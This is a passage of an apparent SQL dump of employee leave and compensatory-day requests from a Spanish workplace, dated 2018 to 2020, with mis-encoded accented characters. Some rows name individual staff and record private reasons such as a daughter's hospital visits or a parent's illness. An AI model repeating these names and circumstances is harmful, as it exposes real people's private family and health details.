COMPUTO',NULL,'',0,'ACEPTADO','',303,'2018-12-03 07:25:43','2018-12-03 07:30:21'),(347,358,'2018-12-14','DEVOLUCION COMPUTO',NULL,'',0,'ACEPTADO','',304,'2018-12-05 08:57:06','2018-12-05 08:59:18'),(348,367,'2018-12-23','EXCESO COMPUTO 2017',NULL,'',0,'ACEPTADO','',306,'2018-12-12 05:51:39','2018-12-12 05:52:23'),(349,293,'2019-01-03','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,307,'2018-12-18 06:34:21','2018-12-18 06:34:21'),(350,171,'2018-12-28','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,309,'2018-12-21 08:31:40','2018-12-21 08:31:40'),(352,171,'2018-12-30','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,311,'2018-12-21 08:31:40','2018-12-21 08:31:40'),(355,247,'2018-12-31','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,314,'2018-12-28 09:19:29','2018-12-28 09:19:29'),(356,247,'2019-01-02','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,315,'2018-12-28 09:19:44','2018-12-28 09:19:44'),(357,370,'2019-01-08','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,316,'2019-01-18 08:11:09','2019-01-18 08:11:09'),(358,363,'2019-01-08','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,317,'2019-01-18 08:12:24','2019-01-18 08:12:24'),(359,228,'2019-01-26','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,318,'2019-01-18 08:51:29','2019-01-18 08:51:29'),(360,126,'2019-02-06','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,319,'2019-01-22 13:11:25','2019-01-22 13:11:25'),(361,225,'2019-02-12','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,320,'2019-01-30 09:00:03','2019-01-30 09:00:03'),(362,225,'2019-02-13','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,321,'2019-01-30 09:00:17','2019-01-30 09:00:17'),(363,367,'2019-08-03','Descanso exceso computo aГұo anterior.',NULL,'',0,'PENDIENTE',NULL,NULL,'2019-02-05 07:48:56','2019-02-05 07:48:56'),(364,367,'2019-08-04','Descando  a exceso computo aГұo anterior.',NULL,'',0,'PENDIENTE',NULL,NULL,'2019-02-05 07:49:42','2019-02-05 07:49:42'),(366,190,'2019-05-03','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,322,'2019-02-13 06:01:50','2019-02-13 06:01:50'),(367,126,'2019-07-18','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,323,'2019-02-13 06:05:14','2019-02-13 06:05:14'),(370,126,'2019-07-19','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,326,'2019-02-13 06:06:13','2019-02-13 06:06:13'),(371,126,'2019-07-20','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,327,'2019-02-13 06:06:13','2019-02-13 06:06:13'),(372,126,'2019-07-22','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,328,'2019-02-13 06:06:31','2019-02-13 06:06:31'),(373,126,'2019-07-23','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,329,'2019-02-13 06:06:31','2019-02-13 06:06:31'),(374,126,'2019-07-24','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,330,'2019-02-13 06:06:31','2019-02-13 06:06:31'),(375,150,'2019-12-24','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,331,'2019-02-14 06:17:52','2019-02-14 06:17:52'),(376,150,'2019-12-25','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,332,'2019-02-14 06:17:52','2019-02-14 06:17:52'),(378,190,'2019-05-16','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,334,'2019-02-22 06:12:27','2019-02-22 06:12:27'),(379,190,'2019-05-17','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,335,'2019-02-22 06:12:27','2019-02-22 06:12:27'),(380,81,'2019-08-24','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,336,'2019-03-02 06:58:13','2019-03-02 06:58:13'),(381,81,'2019-08-25','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,337,'2019-03-02 06:58:13','2019-03-02 06:58:13'),(382,81,'2019-08-26','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,338,'2019-03-02 06:58:13','2019-03-02 06:58:13'),(383,370,'2019-05-10','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,339,'2019-03-20 08:33:06','2019-03-20 08:33:06'),(384,370,'2019-05-11','exceso computo aГұo 2018','2019-05-11','',0,'ACEPTADO','',345,'2019-03-20 08:34:56','2019-03-20 12:18:46'),(385,370,'2019-05-12','exceso computo aГұo 2018','2019-05-12','',0,'ACEPTADO','',346,'2019-03-20 08:36:06','2019-03-20 12:19:00'),(387,394,'2019-03-27','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,341,'2019-03-20 11:26:03','2019-03-20 11:26:03'),(388,63,'2019-03-27','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,342,'2019-03-20 11:41:16','2019-03-20 11:41:16'),(390,380,'2019-03-27','EXCESO COMPUTO 2018 EXAMEN','2019-03-27','',0,'ACEPTADO','',343,'2019-03-20 12:14:39','2019-03-20 12:15:19'),(391,378,'2019-03-27','EXCESO COMPUTO 2018 EXAMEN','2019-03-27','',0,'ACEPTADO','',344,'2019-03-20 12:16:32','2019-03-20 12:16:51'),(392,370,'2019-03-27','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,347,'2019-03-20 12:21:37','2019-03-20 12:21:37'),(393,378,'2019-03-22','exceso computo','2019-05-18','',0,'ACEPTADO','',348,'2019-03-22 09:04:41','2019-03-22 09:18:43'),(394,378,'2019-05-19','exceso computo aГұo 2018','2019-05-19','',0,'ACEPTADO','',349,'2019-03-22 09:07:19','2019-03-22 09:20:04'),(400,233,'2019-09-01','exceso 2018',NULL,'\r\n',0,'PENDIENTE',NULL,NULL,'2019-03-25 15:45:36','2019-05-22 08:34:18'),(401,63,'2019-04-02','exceso computo preparar examen','2019-04-02','exceso computo',0,'ACEPTADO','',356,'2019-04-01 07:52:53','2019-04-01 07:54:46'),(402,63,'2019-04-03','exceso computo 2018 preparar examen','2019-04-03','exceso computo',0,'ACEPTADO','',357,'2019-04-01 07:53:33','2019-04-01 07:55:09'),(403,63,'2019-04-04','exceso computo 2018 preparar examen.','2019-04-04','exceso computo.',0,'ACEPTADO','',358,'2019-04-01 07:54:09','2019-04-01 07:55:25'),(404,233,'2019-08-31','exceso computo 2018',NULL,'',0,'PENDIENTE',NULL,NULL,'2019-04-01 07:59:24','2019-05-22 08:33:47'),(405,239,'2019-08-06','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,359,'2019-04-04 06:43:28','2019-04-04 06:43:28'),(406,239,'2019-08-07','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,360,'2019-04-04 06:43:28','2019-04-04 06:43:28'),(407,239,'2019-11-10','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,361,'2019-04-04 06:44:28','2019-04-04 06:44:28'),(408,1000,'2019-04-18','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,362,'2019-04-12 11:35:36','2019-04-12 11:35:36'),(409,1000,'2019-04-19','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,363,'2019-04-12 11:35:36','2019-04-12 11:35:36'),(410,1000,'2019-04-27','motivos personales',NULL,'',0,'ACEPTADO','',364,'2019-04-12 11:38:06','2019-04-12 11:39:13'),(412,81,'2019-05-02','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,366,'2019-04-24 06:20:36','2019-04-24 06:20:36'),(414,367,'2019-06-16','exceso aГұo anterior',NULL,'',0,'ACEPTADO','',378,'2019-04-25 07:38:24','2019-05-22 08:35:09'),(418,167,'2019-03-02','solicita por correo','2019-04-28','',0,'PENDIENTE',NULL,NULL,'2019-04-29 08:36:42','2019-12-04 08:17:14'),(419,244,'2019-05-12','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,370,'2019-04-30 04:54:22','2019-04-30 04:54:22'),(420,253,'2019-05-22','consultas hospital hija','2019-05-07','CUBRIR T4 SIN AINHOA ARETXABALETA',0,'ACEPTADO','',NULL,'2019-05-02 05:58:29','2019-05-03 08:56:13'),(421,225,'2019-06-13','solicitado agente exceso 2018',NULL,'',0,'ACEPTADO','',371,'2019-05-02 06:25:13','2019-05-02 06:27:20'),(422,225,'2019-06-14','solicitado agente exceso computo 2018',NULL,'',0,'ACEPTADO','',372,'2019-05-02 06:28:23','2019-05-02 06:28:53'),(423,133,'2019-05-07','descanso por exceso computo aГұo anterior 2018','2019-05-07','exceso computo aГұpo 2018',0,'ACEPTADO','',374,'2019-05-08 06:09:36','2019-05-08 06:29:54'),(424,133,'2019-05-08','descanso por exceso computo aГұo 2018','2019-05-08','exceso computo aГұo 2018',0,'ACEPTADO','',373,'2019-05-08 06:25:25','2019-05-08 06:25:57'),(426,380,'2019-06-21','descanso a cuenta exceso computo aГұo 2018',NULL,'',0,'ACEPTADO','',375,'2019-05-13 15:25:26','2019-05-13 15:26:19'),(427,380,'2019-06-22','descanso a  cuenta exceso computo 2018',NULL,'',0,'ACEPTADO','',376,'2019-05-13 15:27:29','2019-05-13 15:27:54'),(428,380,'2019-06-23','descanso a cuenta exceso computo aГұo 2018',NULL,'',0,'ACEPTADO','',377,'2019-05-13 15:28:45','2019-05-13 15:29:11'),(429,366,'2019-05-11','Descanso exceso de cГіmputo por enfermedad de su aita',NULL,'',0,'ACEPTADO','',380,'2019-05-14 14:40:03','2019-05-14 14:42:54'),(430,366,'2019-05-12','Descanso exceso de cГіmputo por enfermedad de su aita',NULL,'',0,'ACEPTADO','',379,'2019-05-14 14:40:20','2019-05-14 14:42:17'),(431,198,'2020-01-01','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,381,'2019-05-15 12:33:07','2019-05-15 12:33:07'),(432,363,'2019-07-14','exceso computo aГұo anterior',NULL,'',0,'ACEPTADO','',390,'2019-05-22 08:32:15','2019-05-31 09:41:18'),(433,375,'2019-06-24','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,382,'2019-05-27 12:15:28','2019-05-27 12:15:28'),(434,375,'2019-06-25','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,383,'2019-05-27 12:15:28','2019-05-27 12:15:28'),(435,375,'2019-06-26','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,384,'2019-05-27 12:15:28','2019-05-27 12:15:28'),(436,375,'2019-06-27','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,385,'2019-05-27 12:15:28','2019-05-27 12:15:28'),(437,375,'2019-06-28','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,386,'2019-05-27 12:15:28','2019-05-27 12:15:28'),(438,201,'2019-09-01','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,387,'2019-05-29 06:50:42','2019-05-29 06:50:42'),(441,190,'2019-06-13','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,391,'2019-06-11 10:21:46','2019-06-11 10:21:46'),(442,371,'2019-07-01','EXCESO HORAS AГ‘O 2018',NULL,'',0,'PENDIENTE',NULL,NULL,'2019-06-13 10:06:00','2019-06-13 10:06:00'),(443,371,'2019-07-06','EXCESO AГ‘O 2018',NULL,'',0,'PENDIENTE',NULL,NULL,'2019-06-13 10:06:25','2019-06-13 10:06:25'),(444,371,'2019-07-07','EXCESO AГ‘O 2018',NULL,'',0,'PENDIENTE',NULL,NULL,'2019-06-13 10:06:48','2019-06-13 10:06:48'),(447,363,'2019-06-29','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,394,'2019-06-24 08:34:49','2019-06-24 08:34:49'),(448,363,'2019-06-28','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,395,'2019-06-24 08:36:21','2019-06-24 08:36:21'),(449,239,'2019-08-09','ES POSIBLE SOLICITARLO A CUENTA DE PROXIMO SABADO NOCTURNO A TRABAJAR EL 27/07/2019?',NULL,NULL,0,'PENDIENTE',NULL,NULL,'2019-07-07 13:51:02','2019-07-07 13:51:02'),(450,336,'2019-07-31','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,396,'2019-07-09 14:23:04','2019-07-09 14:23:04'),(451,336,'2019-08-01','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,397,'2019-07-09 14:23:29','2019-07-09 14:23:29'),(452,336,'2019-08-02','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,398,'2019-07-09 14:23:48','2019-07-09 14:23:48'),(453,217,'2019-08-12','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,401,'2019-07-18 07:29:40','2019-07-18 07:29:40'),(454,150,'2019-10-09','MOTIVOS PERSONALES','2019-10-26','DIA SOLICITADO POR JON ZUMALABE',0,'ACEPTADO','',NULL,'2019-07-22 06:14:12','2019-10-22 11:32:43'),(455,150,'2019-10-10','MOTIVOS PERSONALES',NULL,'',1,'ACEPTADO','',NULL,'2019-07-22 06:14:32','2019-07-22 06:14:58'),(456,276,'2019-07-30','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,402,'2019-07-29 10:54:10','2019-07-29 10:54:10'),(457,276,'2019-07-31','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,403,'2019-07-29 10:54:24','2019-07-29 10:54:24'),(458,276,'2019-08-01','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,404,'2019-07-29 11:04:13','2019-07-29 11:04:13'),(459,276,'2019-08-02','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,405,'2019-07-29 11:04:24','2019-07-29 11:04:24'),(460,375,'2019-08-31','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,406,'2019-08-12 10:44:38','2019-08-12 18:46:06'),(461,393,'2019-11-02','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,407,'2019-08-20 07:17:40','2019-08-20 07:17:40'),(462,393,'2019-11-03','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,408,'2019-08-20 07:17:40','2019-08-20 07:17:40'),(463,159,'2019-09-07','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,409,'2019-08-23 06:40:26','2019-08-23 06:40:26'),(464,159,'2019-09-08','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,410,'2019-08-23 06:40:26','2019-08-23 06:40:26'),(466,358,'2019-11-11','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,412,'2019-09-04 07:39:47','2019-09-04 07:39:47'),(467,1000,'2019-09-13','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,413,'2019-09-11 18:59:58','2019-09-11 19:21:13'),(468,133,'2019-09-27','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,414,'2019-09-16 11:08:18','2019-09-16 11:08:18'),(469,133,'2019-10-05','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,415,'2019-09-16 11:09:41','2019-09-16 11:09:41'),(471,363,'2019-12-28','DEVOLUCION COMPUTO',NULL,NULL,0,'PENDIENTE',NULL,417,'2019-09-19 06:58:12','2019-09-19 06:58:12'),(473,244,'2019-12-06','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,419,'2019-09-20 10:56:01','2019-09-20 11:27:50'),(474,244,'2019-12-07','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,420,'2019-09-20 10:56:50','2019-09-20 11:27:40'),(475,244,'2019-12-08','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,421,'2019-09-20 10:57:44','2019-09-20 11:27:33'),(476,244,'2019-12-09','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,422,'2019-09-20 10:58:32','2019-09-20 11:27:22'),(477,229,'2019-10-12','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,423,'2019-09-23 13:09:57','2019-09-23 13:09:57'),(478,370,'2019-12-23','DEVOLUCION COMPUTO',NULL,NULL,0,'PENDIENTE',NULL,424,'2019-09-28 09:08:12','2019-09-28 09:08:12'),(479,370,'2019-12-24','DEVOLUCION COMPUTO',NULL,NULL,0,'PENDIENTE',NULL,425,'2019-09-28 09:08:42','2019-09-28 09:08:42'),(480,370,'2019-12-25','DEVOLUCION COMPUTO',NULL,NULL,0,'PENDIENTE',NULL,426,'2019-09-28 09:09:04','2019-09-28 09:09:04'),(481,253,'2019-10-07','Necesita el dГӯa','2020-01-24','peticiГіn empresa',1,'PENDIENTE',NULL,NULL,'2019-09-30 14:24:32','2020-02-03 12:52:52'),(483,363,'2019-12-21','DEVOLUCION COMPUTO',NULL,NULL,0,'PENDIENTE',NULL,428,'2019-10-12 07:45:54','2019-10-12 07:45:54'),(484,363,'2019-12-22','DEVOLUCION COMPUTO',NULL,NULL,0,'PENDIENTE',NULL,429,'2019-10-12 07:46:20','2019-10-12 07:46:20'),(485,395,'2019-12-05','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,430,'2019-10-25 09:53:45','2019-10-25 09:53:45'),(486,395,'2019-12-04','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,431,'2019-10-25 09:54:15','2019-10-25 09:54:15'),(487,395,'2019-12-03','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,432,'2019-10-25 09:54:43','2019-10-25 09:54:43'),(488,167,'2019-11-01','solicita por email','2019-12-15','solicitud empresa',0,'ACEPTADO','',NULL,'2019-10-25 10:55:10','2019-12-05 14:39:09'),(491,228,'2019-11-16','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,435,'2019-11-05 10:59:51','2019-11-05 10:59:51'),(492,380,'2019-12-13','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,436,'2019-11-12 15:29:28','2019-11-12 15:29:28'),(493,234,'2019-12-11','Peticion',NULL,'',0,'ACEPTADO','',604,'2019-11-14 13:44:47','2021-06-11 06:43:02'),(494,159,'2019-11-30','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,437,'2019-11-19 10:45:03','2019-11-19 12:07:41'),(495,159,'2019-12-01','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,438,'2019-11-19 10:45:47','2019-11-19 12:07:36'),(496,159,'2019-12-30','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,439,'2019-11-19 10:46:53','2019-11-19 12:06:51'),(497,371,'2019-12-05','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,440,'2019-11-21 12:24:30','2019-11-21 12:24:30'),(498,371,'2019-12-06','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,441,'2019-11-21 12:25:06','2019-11-21 12:25:06'),(501,171,'2019-12-19','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,444,'2019-12-10 11:10:02','2019-12-10 11:10:02'),(502,171,'2019-12-20','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,445,'2019-12-10 11:10:02','2019-12-10 11:10:02'),(504,358,'2019-12-28','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,446,'2019-12-19 09:30:26','2019-12-19 09:30:26'),(505,358,'2019-12-29','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,447,'2019-12-19 09:30:49','2019-12-19 09:30:49'),(506,358,'2019-12-30','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,448,'2019-12-26 16:10:05','2019-12-26 16:10:05'),(507,358,'2019-12-31','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,449,'2019-12-26 16:10:25','2019-12-26 16:10:25'),(511,225,'2020-03-06','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,453,'2020-02-20 09:13:38','2020-02-20 09:13:38'),(512,225,'2020-03-07','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,454,'2020-02-20 09:15:16','2020-02-20 09:15:16'),(513,225,'2020-03-08','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,455,'2020-02-20 09:15:42','2020-02-20 09:15:42'),(520,196,'2020-08-19','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,463,'2020-02-26 06:31:12','2020-02-26 06:31:12'),(521,196,'2020-08-20','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,464,'2020-02-26 06:31:12','2020-02-26 06:31:12'),(522,196,'2020-08-22','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,465,'2020-02-26 06:32:08','2020-02-26 06:32:08'),(523,196,'2020-08-23','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,466,'2020-02-26 06:32:08','2020-02-26 06:32:08'),(524,196,'2020-08-18','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,467,'2020-02-26 06:32:29','2020-02-26 06:32:29'),(525,239,'2020-03-02','DEVOLUCION COMPUTO','2020-08-03',NULL,0,'ACEPTADO','',468,'2020-03-02 12:01:22','2020-03-02 12:11:54'),(526,202,'2020-02-17','solicitud trabajadora','2020-03-09','necesidades',0,'ACEPTADO','',NULL,'2020-03-05 08:51:34','2020-08-06 09:44:10'),(533,292,'2020-08-06','DEVOLUCION COMPUTO','2020-08-06',NULL,0,'ACEPTADO',NULL,477,'2020-03-19 18:46:19','2020-03-20 06:11:02'),(534,292,'2020-08-07','DEVOLUCION COMPUTO','2020-08-07',NULL,0,'ACEPTADO',NULL,478,'2020-03-19 18:47:00','2020-03-20 06:11:16'),(535,292,'2020-08-18','DEVOLUCION COMPUTO','2020-08-18',NULL,0,'ACEPTADO',NULL,479,'2020-03-19 18:50:42','2020-03-20 06:11:32'),(536,292,'2020-08-19','DEVOLUCION COMPUTO','2020-08-19',NULL,0,'ACEPTADO',NULL,480,'2020-03-19 18:51:16','2020-03-20 06:11:41'),(537,405,'2020-05-13','ConciliaciГіn personal, devuelve de vacaciones','2020-06-29','por dia pedido el 13/05',1,'PENDIENTE',NULL,NULL,'2020-05-12 07:51:04','2020-05-22 11:52:50'),(538,405,'2020-05-18','ConciliaciГіn familiar, devuelve en vacaciones','2020-07-06','por dia pedido 18/05',1,'PENDIENTE',NULL,NULL,'2020-05-12 07:51:40','2020-05-22 11:53:44'),(539,405,'2020-05-20','ConciliaciГіn familiar, devuelve en vacaciones','2020-07-07','por dia pedido el 20/05',1,'PENDIENTE',NULL,NULL,'2020-05-12 07:52:00','2020-05-22 11:54:38'),(540,405,'2020-05-22','ConciliaciГіn familiar, devuelve en vacaciones','2020-07-08','por dia pedido el 22/05',1,'PENDIENTE',NULL,NULL,'2020-05-12 07:52:21','2020-05-22 11:56:19'),(541,405,'2020-06-08','ConciliaciГіn familiar, devuelve en fes','2020-10-13','por dia 08/06',1,'PENDIENTE',NULL,NULL,'2020-05-12 07:53:08','2020-05-22 11:57:30'),(542,405,'2020-06-10','ConciliaciГіn familiar, devuelve en fes','2020-10-20','por dia 10/06',1,'PENDIENTE',NULL,NULL,'2020-05-12 07:53:25','2020-05-22 11:58:09'),(543,405,'2020-06-06','ConciliaciГіn familiar, devuelve en vacaciones','2020-07-18','por dГӯa 6/06',1,'PENDIENTE',NULL,NULL,'2020-05-22 11:59:29','2020-05-22 11:59:29'),(544,405,'2020-06-07','ConciliaciГіn familiar, devuelve en vacaciones','2020-07-19','por dГӯa 07/06',1,'PENDIENTE',NULL,NULL,'2020-05-22 12:00:29','2020-05-22 12:00:29'),(545,378,'2020-07-15','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,481,'2020-06-05 06:09:55','2020-06-05 06:09:55'),(546,378,'2020-07-16','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,482,'2020-06-05 06:10:26','2020-06-05 06:10:26'),(547,378,'2020-07-20','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,483,'2020-06-05 06:13:05','2020-06-05 06:13:05'),(548,378,'2020-07-21','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,484,'2020-06-05 06:13:21','2020-06-05 06:13:21'),(550,371,'2020-08-25','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,486,'2020-06-05 07:32:46','2020-06-05 07:32:46'),(551,81,'2020-08-20','DEVOLUCION COMPUTO','2020-08-20',NULL,0,'ACEPTADO',NULL,487,'2020-06-06 18:33:26','2020-06-08 05:23:11'),(552,81,'2020-08-21','DEVOLUCION COMPUTO','2020-08-21',NULL,0,'ACEPTADO',NULL,488,'2020-06-06 18:34:32','2020-06-08 05:23:17'),(553,363,'2020-07-11','DEVOLUCION COMPUTO','2020-07-11',NULL,0,'ACEPTADO','',489,'2020-06-11 06:20:14','2020-06-11 07:30:49'),(554,276,'2020-06-15','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,490,'2020-06-12 07:51:37','2020-06-12 07:51:37'),(555,291,'2020-07-30','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,491,'2020-06-19 11:44:47','2020-06-19 11:44:47'),(556,217,'2020-08-03','necesidad de dia','2020-10-25','dia solicitado por david',0,'PENDIENTE',NULL,NULL,'2020-07-14 10:52:35','2020-10-26 08:39:18'),(557,217,'2020-08-04','necesita el dia','2021-08-27','Dias vacaciones Juango',0,'PENDIENTE',NULL,NULL,'2020-07-14 10:53:34','2021-09-07 08:07:41'),(558,217,'2020-08-05','necesita el dia','2021-08-28','dias vacaciones juango',0,'PENDIENTE',NULL,NULL,'2020-07-14 10:54:02','2021-09-07 08:08:03'),(559,217,'2020-08-06','necesita el dia','2021-08-29','dias vacaciones juango',0,'PENDIENTE',NULL,NULL,'2020-07-14 10:54:25','2021-09-07 08:08:21'),(561,63,'2020-08-10','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,492,'2020-08-04 06:48:44','2020-08-04 06:48:44'),(562,63,'2020-08-11','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,493,'2020-08-04 06:49:09','2020-08-04 06:49:09'),(563,63,'2020-08-12','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,494,'2020-08-04 06:49:27','2020-08-04 06:49:27'),(564,371,'2020-08-24','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,495,'2020-08-04 06:58:35','2020-08-04 06:58:35'),(565,371,'2020-08-20','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,496,'2020-08-04 06:59:19','2020-08-04 06:59:19'),(566,167,'2020-08-26','peticion dia','2020-11-03','',0,'ACEPTADO','',NULL,'2020-08-04 09:57:18','2020-11-03 15:46:03'),(567,167,'2020-08-27','peticion dia','2020-11-11','',0,'ACEPTADO','',NULL,'2020-08-04 09:57:41','2020-11-03 15:46:12'),(568,247,'2020-10-05','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,497,'2020-08-06 07:08:06','2020-08-06 07:08:06'),(569,247,'2020-10-06','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,498,'2020-08-06 07:08:06','2020-08-06 07:08:06'),(570,247,'2020-10-07','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,499,'2020-08-06 07:08:06','2020-08-06 07:08:06'),(571,247,'2020-10-08','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,500,'2020-08-06 07:08:06','2020-08-06 07:08:06'),(572,247,'2020-10-09','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,501,'2020-08-06 07:08:06','2020-08-06 07:08:06'),(573,371,'2020-08-19','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,502,'2020-08-06 09:32:04','2020-08-06 09:32:04'),(574,378,'2020-08-21','Cambio realizado con Alberto Sanchez, no puede trabajar los 7 dГӯas de la semana','2020-12-28','DГӯa pedido por Roberto Fernandez',0,'PENDIENTE',NULL,NULL,'2020-08-17 13:50:16','2020-12-17 09:14:22'),(575,63,'2020-09-16','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,503,'2020-08-20 08:12:48','2020-08-20 08:12:48'),(576,63,'2020-08-17','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,504,'2020-08-20 08:13:18','2020-08-20 08:13:18'),(577,63,'2020-08-18','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,505,'2020-08-20 08:13:18','2020-08-20 08:13:18'),(578,190,'2020-09-18','DEVOLUCION 